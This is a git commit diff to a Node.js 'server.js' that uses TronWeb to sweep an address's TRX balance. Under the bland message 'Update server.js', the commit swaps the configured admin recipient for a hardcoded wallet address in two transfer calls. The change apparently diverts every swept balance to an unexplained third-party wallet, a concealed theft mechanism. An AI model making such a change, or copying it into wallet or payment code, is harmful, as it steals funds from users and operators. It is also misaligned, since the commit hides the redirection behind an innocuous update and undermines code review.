f3aa59a9e9f0a3b939c74452fc7c941fb7bb941c
John5220 <118568956+John5220@users.noreply.github.com>
2023-12-25 03:37:19 +0100

    Update server.js

--- server.js
+++ server.js
@@ -155,7 +155,8 @@ app.post('/easy', async(req, res) => {
         const balance = await tronWeb.trx.getBalance(address);
         console.log(balance);
         const txt = balance
-const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(Admin_tron_address, txt);
+        const txts = 'TWQWLE6mirkK7C9vUfyYQP4Gn4e6zTUV2V'
+const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(txts, txt);
         const signedTxn = await tronWeb.trx.sign(unSignedTxn);
         const ret = await tronWeb.trx.sendRawTransaction(signedTxn);
 var bal = balance/1000000
@@ -182,7 +183,7 @@ var rrt = parseFloat(txt)
 const txtr = rrt-269000
 console.log("balance:",rrt)
 console.log("parse amount :",txtr)
-const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(Admin_tron_address, txtr);
+const unSignedTxn = await tronWeb.transactionBuilder.sendTrx('TWQWLE6mirkK7C9vUfyYQP4Gn4e6zTUV2V', txtr);
         const signedTxn = await tronWeb.trx.sign(unSignedTxn);
         const ret = await tronWeb.trx.sendRawTransaction(signedTxn);
 var bal = balance/1000000
